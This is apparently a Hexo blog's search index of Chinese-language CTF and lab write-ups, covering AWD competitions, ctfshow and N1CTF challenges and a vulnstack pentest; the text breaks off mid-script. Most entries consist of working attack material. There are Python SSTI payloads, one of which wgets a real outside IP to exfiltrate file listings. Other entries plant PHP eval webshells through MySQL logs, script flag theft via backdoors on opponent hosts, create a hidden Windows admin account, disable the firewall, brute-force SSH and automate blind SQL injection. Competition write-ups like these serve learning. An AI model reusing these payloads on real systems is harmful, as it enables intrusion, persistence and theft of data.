<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>西湖&amp;湖湘有感</title>
    <link href="/2020/11/15/%E8%A5%BF%E6%B9%96-%E6%B9%96%E6%B9%98%E6%9C%89%E6%84%9F/"/>
    <url>/2020/11/15/%E8%A5%BF%E6%B9%96-%E6%B9%96%E6%B9%98%E6%9C%89%E6%84%9F/</url>
    
    <content type="html"><![CDATA[<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>AWD是这两次来首次接触的，作为躺狗躺的是真的舒服(也很难受，自己没发挥多少作用)，记下流水账，记录下一些暴露的问题。</p><p>13号到杭州与guoke、Y老师、ha1面基，到酒店打卡登记入住，面基了很多师傅。再后面就度过了一晚上，第二天7.30起床前往比赛场地在场地开始了一天的比赛。</p><p>​        比赛没开始前给的靶机就已经可以访问到，是phpcms v9.6.3，没什么cve可以一把梭，到开赛下载文件才发现有后门在附件里，直接连上就可以了。比赛是curl靶机就可以得分的那种，所以直接写一个</p><p> <code>while true;do curl 靶机ip+token;done</code></p><p>然后就看着小蓝师傅在疯狂上分qwq</p><p>然后半天都没人打phpcms，我就因为审计不出题在发呆。qwq</p><p>最后几波被上了内存马 我杀不掉 很烦。</p><pre><code class="hljs coq">ps aux | <span class="hljs-type">grep</span> www-data | <span class="hljs-type">awk</span> &#x27;&#123;print $<span class="hljs-number">2</span>&#125;&#x27; | <span class="hljs-type">xargs</span> kill <span class="hljs-number">-9</span>ps aux | <span class="hljs-type">grep</span> -v grep| <span class="hljs-type">grep</span> -v PID | <span class="hljs-type">cut</span> -c <span class="hljs-number">12</span><span class="hljs-number">-16</span> | <span class="hljs-type">xargs</span> kill <span class="hljs-number">-9</span>ps -ef | <span class="hljs-type">grep</span> -v grep| <span class="hljs-type">grep</span> -v PID | <span class="hljs-type">cut</span> -c <span class="hljs-number">12</span><span class="hljs-number">-16</span> | <span class="hljs-type">xargs</span> kill <span class="hljs-number">-9</span></code></pre><p>然后ctf题也没出，到最后上了watchbird看看流量（因为一上watchbird就异常，异常的话就没分）抓别人的马上车，躺了二等奖。打到最后面基本上服务都是非常卡的，所以说用python跑的话会异常的慢，可以尝试shell编程用curl跑。</p><p>​    本来是准备做18:58的高铁赶去湖湘杯，然后我地铁坐反了导致没赶上高铁跟guoke坐了飞机，晚上11点多到黄花机场，碰到了北极星的师傅一起打车去益阳（每人达成花了100块，有点肉疼），到酒店就睡觉去了准备好精力打第二天的比赛。</p><p>​    上午赛制是ctf类型的渗透题（也不像），不开网就很操蛋，有点懵逼。开始一题在web目录下就url/flag1,也有个web.tar可能这第一关是叫扫目录吧。c第二关就thinkphp rce 我用xray扫了一手，payload直接打，flag2在根目录下，有了个提示。</p><pre><code class="hljs apache"><span class="hljs-attribute">flag2</span>&#123;<span class="hljs-number">5</span>bc<span class="hljs-number">4</span>e<span class="hljs-number">2</span>-c<span class="hljs-number">073</span>b<span class="hljs-number">65</span>-<span class="hljs-number">39</span>d<span class="hljs-number">20</span>b<span class="hljs-number">49</span>-<span class="hljs-number">270629</span>e<span class="hljs-number">5</span>f<span class="hljs-number">11</span>&#125;<span class="hljs-attribute">tips</span>:<span class="hljs-attribute">1</span>.You need login the system by root,and i just can tell u the password is venus.XXXX<span class="hljs-attribute">2</span>.X is made up of numbers.</code></pre><p>爆破ssh密匙，一脸懵逼的爆破了半天，pwn师傅后面用medusa爆破出来是venus.6677</p><pre><code class="hljs python">medusa -M ssh -h <span class="hljs-number">192.168</span><span class="hljs-number">.157</span><span class="hljs-number">.131</span> -u root -P pwdpwd是存有密码的文件<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;pwd&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">10000</span>):        f.write(<span class="hljs-string">&#x27;venus.&#x27;</span> + <span class="hljs-string">&#x27;0&#x27;</span> * (<span class="hljs-number">4</span> - <span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>(i))) + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;\n&#x27;</span>)</code></pre><p>连接后flag3在根目录下，然后到这里就断了思路（甚至想到了要去docker逃逸），最后主办方提示说内网还有机器，然后是一个贼奇怪的伪协议题，没做出来。</p><p>​    下午的比赛就是纯awd，给了两靶机，一台上是纯web，一台是既有pwn又有web，guoke和pwn师傅去看那个既有pwn又有web的靶机去了，我就去看那个纯web的，然后我被暴捶了。改完密码之后我就是懵圈状态，连源码备份都卡住了，现在想想真不应该,（是不是可以写个脚本自动改密码、备份、改sql密码）</p><pre><code class="hljs awk">tar -zcvf <span class="hljs-regexp">/tmp/</span>etc.tar.gz wwwtar -zxvf etc.tar.gz -C <span class="hljs-regexp">/var/</span>mysqldump -u root --all-databases —skip-lock-tables &gt; <span class="hljs-regexp">/tmp/</span>db.sqlsource <span class="hljs-regexp">/tmp/</span>db.sqlset password=password(<span class="hljs-string">&#x27;new password&#x27;</span>);  <span class="hljs-regexp">//</span>改密码端口 netstat -tunlp</code></pre><p>然后就是上waf，我的waf被我改坏了导致我一直上不去，其实可以早点测试就不会出这么多bug了。还有文件监控和流量监控脚本，凉凉qwq。</p><p>等前30min过后就是正式打，第一波有20几个队伍没有修理那个内存马可以直接system执行，可惜我当时已经懵了内存马都没去上，回去复现了下，最简单两种，eval和system</p><pre><code class="hljs elixir"><span class="hljs-comment">#eval</span>data=&#123;<span class="hljs-string">&quot;1&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;file_put_contents(&#x27;1.php&#x27;,base64_decode(&#x27;&quot;</span>+base64shell+<span class="hljs-string">&quot;&#x27;));&quot;</span></span>&#125;<span class="hljs-comment">#system</span>data=&#123;<span class="hljs-string">&quot;1&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;echo &quot;</span>+base64shell+<span class="hljs-string">&quot;|base64 -d &gt; 1.php&quot;</span></span>&#125;</code></pre><p>再后面就手动提交flag，（后面研究研究怎么自动提交）</p><p>guoke当时获取flag的脚本</p><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">echo</span> &#123;101..150&#125;)<span class="hljs-keyword">do</span>&#123;<span class="hljs-built_in">echo</span> 172.16.<span class="hljs-variable">$i</span>.245 ;curl http://172.16.<span class="hljs-variable">$i</span>.245/Uploads/.Guoke.php -X POST -d <span class="hljs-string">&quot;Guoke=guokeguokeguokea&amp;guoke=system(&#x27;cat /flag&#x27;);&quot;</span>&gt; <span class="hljs-variable">$i</span>&#125;&amp;<span class="hljs-keyword">done</span><span class="hljs-comment">#python </span>import os<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(101,151):    result=os.popen(<span class="hljs-string">&#x27;cat &#x27;</span>+str(i)).<span class="hljs-built_in">read</span>()    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;404&#x27;</span> <span class="hljs-keyword">in</span> result or <span class="hljs-string">&#x27;403&#x27;</span> <span class="hljs-keyword">in</span> result:        pass    <span class="hljs-keyword">else</span>:        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;172.16.&#x27;</span>+str(i)+<span class="hljs-string">&#x27;.245&#x27;</span>+<span class="hljs-string">&#x27; &#x27;</span>+result)</code></pre><p>到后面我管的那台机子已经彻底崩溃了</p><p>发现了几个奇怪的东西 比如说改了文件夹的归属（awd一般不给root权限）后面运维就贼麻烦，生成ln文件指向flag</p><pre><code class="hljs armasm"><span class="hljs-symbol">ln</span> -<span class="hljs-built_in">sb</span> /flag md5.png-<span class="hljs-keyword">b</span> 覆盖以前的</code></pre><p>这个跟不死马差不多，防御的方法也差不多</p><pre><code class="hljs vim"><span class="hljs-number">1</span>.<span class="hljs-keyword">ps</span> auxww|<span class="hljs-keyword">grep</span> <span class="hljs-keyword">shell</span>.php 找到pid后杀掉进程就可以，你删掉脚本是起不了作用的，因为php执行的时候已经把脚本读进去解释成opcode运行了<span class="hljs-number">2</span>.重启php等web服务<span class="hljs-number">3</span>.用一个ignore_user_abort(true)脚本，一直竞争写入（断断续续）。usleep要低于对方不死马设置的值。<span class="hljs-number">4</span>.创建一个和不死马生成的马一样名字的文件夹。</code></pre><p>最后就躺了三等奖qwq，还是得多学学运维，多做准备工作</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>影子账号</title>
    <link href="/2020/11/12/%E5%BD%B1%E5%AD%90%E8%B4%A6%E5%8F%B7/"/>
    <url>/2020/11/12/%E5%BD%B1%E5%AD%90%E8%B4%A6%E5%8F%B7/</url>
    
    <content type="html"><![CDATA[<pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">Gs</span>$ Gs666 /addnet localgroup administrators Gs$ /addregedit 复制F值导出注册表net <span class="hljs-keyword">user</span> <span class="hljs-title">Gs</span>$ /del导入注册表</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶机复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux 常用命令</title>
    <link href="/2020/11/09/linux-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2020/11/09/linux-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h2 id="查看端口"><a href="#查看端口" class="headerlink" title="查看端口"></a>查看端口</h2><pre><code class="hljs apache"><span class="hljs-attribute">netstat</span> -ntulp | grep <span class="hljs-number">80</span> <span class="hljs-attribute">kill</span> -<span class="hljs-number">9</span> pid</code></pre><h2 id="挂起程序"><a href="#挂起程序" class="headerlink" title="挂起程序"></a>挂起程序</h2><pre><code class="hljs gradle">nohup <span class="hljs-regexp">/root/</span>runoob.sh &amp;ps -aux | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;runoob.sh&quot;</span> 日志nohup <span class="hljs-regexp">/root/</span>runoob.sh &gt; runoob.log <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> &amp;</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BUUOJ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow1024杯</title>
    <link href="/2020/11/05/ctfshow1024%E6%9D%AF/"/>
    <url>/2020/11/05/ctfshow1024%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h2 id="1024-fastapi"><a href="#1024-fastapi" class="headerlink" title="1024_fastapi"></a>1024_fastapi</h2><p><a href="http://71c626ef-731a-43d9-b315-9c7acd313147.chall.ctf.show/docs#/">http://71c626ef-731a-43d9-b315-9c7acd313147.chall.ctf.show/docs#/</a></p><p>可以看到cccalccc接口</p><p>ssti</p><pre><code class="hljs sqf"><span class="hljs-variable">__builtins__</span>.<span class="hljs-variable">__dict__</span>[<span class="hljs-string">&#x27;__imp&#x27;</span>+<span class="hljs-string">&#x27;ort__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&quot;sleep 3&quot;</span>)q=<span class="hljs-built_in">str</span>([].<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">189</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;ev&#x27;</span>+<span class="hljs-string">&#x27;al&#x27;</span>](<span class="hljs-string">&#x27;__imp&#x27;</span>+<span class="hljs-string">&#x27;ort__(&quot;os&quot;).po&#x27;</span>+<span class="hljs-string">&#x27;pen(&quot;ls ./&quot;).read()&#x27;</span>))q=<span class="hljs-built_in">str</span>([].<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">189</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__imp&#x27;</span>+<span class="hljs-string">&#x27;ort__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).<span class="hljs-variable">__dict__</span>[<span class="hljs-string">&#x27;pop&#x27;</span>+<span class="hljs-string">&#x27;en&#x27;</span>](<span class="hljs-string">&#x27;ls /&#x27;</span>).read())</code></pre><p><a href="https://blog.csdn.net/solitudi/article/details/109404974">https://blog.csdn.net/solitudi/article/details/109404974</a></p><p><a href="https://www.cnblogs.com/M1saka/p/13885682.html#fastapi">https://www.cnblogs.com/M1saka/p/13885682.html#fastapi</a></p><p><a href="https://blog.csdn.net/hiahiachang/article/details/109283286#1024_fastapi_34">https://blog.csdn.net/hiahiachang/article/details/109283286#1024_fastapi_34</a></p><h2 id="1024-柏拉图"><a href="#1024-柏拉图" class="headerlink" title="1024_柏拉图"></a>1024_柏拉图</h2><p>phar反序列化</p><h2 id="1024-图片代理"><a href="#1024-图片代理" class="headerlink" title="1024_图片代理"></a>1024_图片代理</h2><p>读配置文件得到路径</p><pre><code class="hljs awk">file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/etc/</span>nginx/nginx.conffile:<span class="hljs-regexp">//</span><span class="hljs-regexp">/etc/</span>nginx<span class="hljs-regexp">/conf.d/</span>default.conf<span class="hljs-regexp">/var/</span>www/bushihtml</code></pre><p>Gopher打fastcgi</p><h2 id="1024-WEB签到"><a href="#1024-WEB签到" class="headerlink" title="1024_WEB签到"></a>1024_WEB签到</h2><p>phpinfo中定义了一个函数ctfshow_1024</p><h2 id="1024-hello-world"><a href="#1024-hello-world" class="headerlink" title="1024_hello_world"></a>1024_hello_world</h2><p>ssti</p><pre><code class="hljs q"><span class="hljs-built_in">key</span>=&#123;% if ()|<span class="hljs-built_in">attr</span>(<span class="hljs-string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>)|<span class="hljs-built_in">attr</span>(<span class="hljs-string">&quot;\x5f\x5fbase\x5f\x5f&quot;</span>)|<span class="hljs-built_in">attr</span>(<span class="hljs-string">&quot;\x5f\x5fsubclasses\x5f\x5f&quot;</span>)()|<span class="hljs-built_in">attr</span>(<span class="hljs-string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="hljs-number">81</span>)|<span class="hljs-built_in">attr</span>(<span class="hljs-string">&quot;\x5f\x5finit\x5f\x5f&quot;</span>)|<span class="hljs-built_in">attr</span>(<span class="hljs-string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>)|<span class="hljs-built_in">attr</span>(<span class="hljs-string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="hljs-string">&quot;\x5f\x5fbuiltins\x5f\x5f&quot;</span>)|<span class="hljs-built_in">attr</span>(<span class="hljs-string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="hljs-string">&quot;eval&quot;</span>)(<span class="hljs-string">&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x22\x6f\x73\x22\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x22\x77\x67\x65\x74\x20\x68\x74\x74\x70\x3a\x2f\x2f\x31\x31\x39\x2e\x34\x35\x2e\x31\x35\x35\x2e\x37\x37\x3a\x31\x33\x33\x37\x2f\x20\x2d\x2d\x70\x6f\x73\x74\x2d\x64\x61\x74\x61\x20\x61\x3d\x60\x6c\x73\x20\x2f\x66\x2a\x7c\x78\x61\x72\x67\x73\x7c\x62\x61\x73\x65\x36\x34\x60\x22\x29&quot;</span>)==<span class="hljs-number">0</span> %&#125;<span class="hljs-number">1</span>&#123;% endif %&#125;<span class="hljs-comment">//__import__(&quot;os&quot;).system(&quot;wget http://119.45.155.77:1337/ --post-data a=`ls /f*|xargs|base64`&quot;)</span>带数据出来</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfshow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnstack (一)</title>
    <link href="/2020/11/03/vulnstack-%E4%B8%80/"/>
    <url>/2020/11/03/vulnstack-%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h2 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h2><p>###phpMyAdmin</p><p>进入phpmyadmin/index.php</p><p>root/root登录</p><p><a href="https://zhuanlan.zhihu.com/p/114184542">https://zhuanlan.zhihu.com/p/114184542</a></p><p><code>show variables like &#39;%secure%&#39;;</code>显示数据库是否有写权限</p><table><thead><tr><th>Variable_name</th><th>Value</th></tr></thead><tbody><tr><td>secure_auth</td><td>OFF</td></tr><tr><td>secure_file_priv</td><td>NULL</td></tr></tbody></table><p>不可写，哪收集一下其他的信息，得知网站后台密码表中用户密码</p><p>admin/168a73655bfecefdb15b14984dd2ad60</p><p>对应的应该是123456，转换还要看代码</p><p>（YXcms默认密码admin/123456）</p><hr><pre><code class="hljs sql">日志getshell<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log = <span class="hljs-string">&quot;ON&quot;</span>;   开启日志记录<span class="hljs-keyword">show</span> <span class="hljs-keyword">variables</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;general%&#x27;</span>;  查看当前的日志目录<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file = <span class="hljs-string">&quot;C:/phpStudy/WWW/yxcms/gs.php&quot;</span>; 指定日志文件<span class="hljs-keyword">select</span> <span class="hljs-string">&quot;&lt;?php eval($_POST[GS]);?&gt;&quot;</span>;马在 http://192.168.52.129/yxcms/gs.php慢查询日志目录<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> slow_query_log = <span class="hljs-string">&quot;ON&quot;</span>;<span class="hljs-keyword">show</span> <span class="hljs-keyword">variables</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%slow%&#x27;</span>;<span class="hljs-keyword">set</span> <span class="hljs-keyword">GLOBAL</span> slow_query_log_file=<span class="hljs-string">&quot;C:/phpStudy/WWW/yxcms/slow.php&quot;</span>;<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php eval($_POST[GS]);?&gt;&#x27;</span> <span class="hljs-keyword">from</span> mysql.db <span class="hljs-keyword">where</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">10</span>);</code></pre><h3 id="YXcms"><a href="#YXcms" class="headerlink" title="YXcms"></a>YXcms</h3><p>登录后台</p><p><a href="http://192.168.52.129/YXcms/index.php?r=admin">http://192.168.52.129/YXcms/index.php?r=admin</a></p><p>模板管理修改代码插入马</p><p>我这里直接修改<strong>index_index.php</strong></p><p>蚁剑连接<code>http://192.168.52.129/yxcms/index.php?r=default/index/index</code>即可</p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p><code>netsh advfirewall set allprofiles state off</code>  关闭防火墙</p><p>打开  cs  </p><pre><code class="hljs css">服务器./<span class="hljs-selector-tag">teamserver</span> 192.168.109.130 <span class="hljs-selector-tag">password</span>客户端<span class="hljs-selector-tag">java</span> <span class="hljs-selector-tag">-XX</span><span class="hljs-selector-pseudo">:+AggressiveHeap</span> <span class="hljs-selector-tag">-XX</span><span class="hljs-selector-pseudo">:+UseParallelGC</span> <span class="hljs-selector-tag">-jar</span> <span class="hljs-selector-tag">cobaltstrike</span><span class="hljs-selector-class">.jar</span></code></pre><p><a href="https://soapffz.com/sec/558.html#menu_index_8">https://soapffz.com/sec/558.html#menu_index_8</a></p><p><a href="https://www.freebuf.com/column/231111.html">https://www.freebuf.com/column/231111.html</a></p><p><a href="https://blog.csdn.net/qq_26091745/article/details/104045182">https://blog.csdn.net/qq_26091745/article/details/104045182</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶机复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>还原mt_rand()</title>
    <link href="/2020/11/03/%E8%BF%98%E5%8E%9Fmt-rand/"/>
    <url>/2020/11/03/%E8%BF%98%E5%8E%9Fmt-rand/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.anquanke.com/post/id/196831#h3-5">https://www.anquanke.com/post/id/196831#h3-5</a></p><p><a href="https://github.com/ambionics/mt_rand-reverse">https://github.com/ambionics/mt_rand-reverse</a></p><p><img src="https://p0.ssl.qhimg.com/t01f23b8d0b94a96475.png" alt="img"></p><p>知道间隔227的两个随机数就能还原出种子</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>phptrick</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ByteCTF2020</title>
    <link href="/2020/10/27/ByteCTF2020/"/>
    <url>/2020/10/27/ByteCTF2020/</url>
    
    <content type="html"><![CDATA[<p><a href="http://blog.ccreater.top/2020/10/26/2020ByteCTF/">http://blog.ccreater.top/2020/10/26/2020ByteCTF/</a></p><p><a href="https://www.anquanke.com/post/id/220810#h2-5">https://www.anquanke.com/post/id/220810#h2-5</a></p><p><a href="https://mp.weixin.qq.com/s/4OVC10crL1rBFrNf9wyUTg">https://mp.weixin.qq.com/s/4OVC10crL1rBFrNf9wyUTg</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>N1CTF 2020</title>
    <link href="/2020/10/17/N1CTF-2020/"/>
    <url>/2020/10/17/N1CTF-2020/</url>
    
    <content type="html"><![CDATA[<h2 id="web-SignIn"><a href="#web-SignIn" class="headerlink" title="web SignIn"></a>web SignIn</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ip</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ip</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$info</span></span>)</span>&#123;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]))&#123;            <span class="hljs-keyword">$this</span>-&gt;ip = <span class="hljs-keyword">$this</span>-&gt;waf(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">$this</span>-&gt;ip =<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>];        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-variable">$con</span>=mysqli_connect(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;********&quot;</span>,<span class="hljs-string">&quot;n1ctf_websign&quot;</span>);        <span class="hljs-variable">$sqlquery</span>=sprintf(<span class="hljs-string">&quot;INSERT into n1ip(`ip`,`time`) VALUES (&#x27;%s&#x27;,&#x27;%s&#x27;)&quot;</span>,<span class="hljs-keyword">$this</span>-&gt;waf(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]),time());        <span class="hljs-keyword">if</span>(!mysqli_query(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sqlquery</span>))&#123;            <span class="hljs-keyword">return</span> mysqli_error(<span class="hljs-variable">$con</span>);        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;your ip looks ok!&quot;</span>;        &#125;        mysqli_close(<span class="hljs-variable">$con</span>);    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">flag</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ip</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$check</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$ip</span></span>) </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;ip = <span class="hljs-variable">$ip</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getflag</span>(<span class="hljs-params"></span>)</span>&#123;    <span class="hljs-keyword">if</span>(md5(<span class="hljs-keyword">$this</span>-&gt;check)===md5(<span class="hljs-string">&quot;key****************&quot;</span>))&#123;    readfile(<span class="hljs-string">&#x27;/flag&#x27;</span>);    &#125;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;ip;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">if</span>(stristr(<span class="hljs-keyword">$this</span>-&gt;ip, <span class="hljs-string">&quot;n1ctf&quot;</span>)!==<span class="hljs-literal">False</span>)            <span class="hljs-keyword">$this</span>-&gt;ip = <span class="hljs-string">&quot;welcome to n1ctf2020&quot;</span>;        <span class="hljs-keyword">else</span>            <span class="hljs-keyword">$this</span>-&gt;ip = <span class="hljs-string">&quot;noip&quot;</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;getflag();    &#125;&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;input&#x27;</span>]))&#123;    <span class="hljs-variable">$input</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;input&#x27;</span>];unserialize(<span class="hljs-variable">$input</span>);&#125;   </code></pre><p>get一个新知识点,触发ip的__toString如果有return值会返回到现在的语句中，比如运行下面这个会输出n1ctf</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ip</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ip</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;n1ctf&quot;</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">flag</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ip</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$ip</span></span>) </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;ip = <span class="hljs-variable">$ip</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">echo</span>(<span class="hljs-keyword">$this</span>-&gt;ip.<span class="hljs-string">&quot;\n&quot;</span>);        var_dump(<span class="hljs-keyword">$this</span>-&gt;ip);    &#125;&#125;<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> flag(<span class="hljs-keyword">new</span> ip);unserialize(serialize(<span class="hljs-variable">$a</span>));</code></pre><p>然后就是写脚本盲注</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> time<span class="hljs-keyword">import</span> string<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str_to_hex</span>(<span class="hljs-params">s</span>):</span>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;0x&#x27;</span>+<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(c)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s])url = <span class="hljs-string">&#x27;http://101.32.205.189/?input=O:4:%22flag%22:2:&#123;s:2:%22ip%22;O:2:%22ip%22:1:&#123;s:2:%22ip%22;N;&#125;s:5:%22check%22;N;&#125;&#x27;</span><span class="hljs-comment"># print(requests.post(url,data=payload).text)</span>x=<span class="hljs-string">&quot;&quot;</span>database=<span class="hljs-string">&quot;database()&quot;</span><span class="hljs-comment">#sql</span>table =<span class="hljs-string">&quot;(select group_concat(table_name) from information_schema.tables where table_schema regexp database())&quot;</span>column=<span class="hljs-string">&quot;(select group_concat(column_name) from information_schema.columns where table_name=&#123;&#125; and table_schema=database())&quot;</span>.<span class="hljs-built_in">format</span>(str_to_hex(<span class="hljs-string">&#x27;n1key&#x27;</span>))data = <span class="hljs-string">&quot;(select `key` from n1key)&quot;</span>zfc = string.printable<span class="hljs-keyword">for</span> Len <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span 